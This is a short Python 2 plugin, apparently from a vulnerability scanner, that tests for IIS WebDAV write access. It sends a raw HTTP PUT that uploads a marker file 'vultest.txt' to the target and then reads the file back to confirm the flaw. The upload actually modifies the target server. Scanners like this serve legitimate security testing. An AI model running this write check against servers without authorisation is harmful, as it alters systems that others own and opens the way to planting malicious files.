# coding=utf-8
import socket
import time
import urllib2
from config import is_port_open, is_http



@is_port_open
def verify(ip, port=80, name=None, timeout=10):
    info = {
        "url": "http://{}:{}".format(ip, port),
        "severity": "high",
        "proof": "http://{}:{}/vultest.txt".format(ip, port),
        "vuln_name": "iis webdav"
    }
    if is_http(ip, int(port)) is False:
        return
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        flag = "PUT /vultest.txt HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % (ip, port)
        s.send(flag)
        time.sleep(1)
        data = s.recv(1024)
        s.close()
        if 'PUT' in data:
            url = 'http://' + ip + ":" + str(port) + '/vultest.txt'
            request = urllib2.Request(url)
            res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
            if 'xxscan0' in res_html:
                return info
    except Exception, e:
        pass
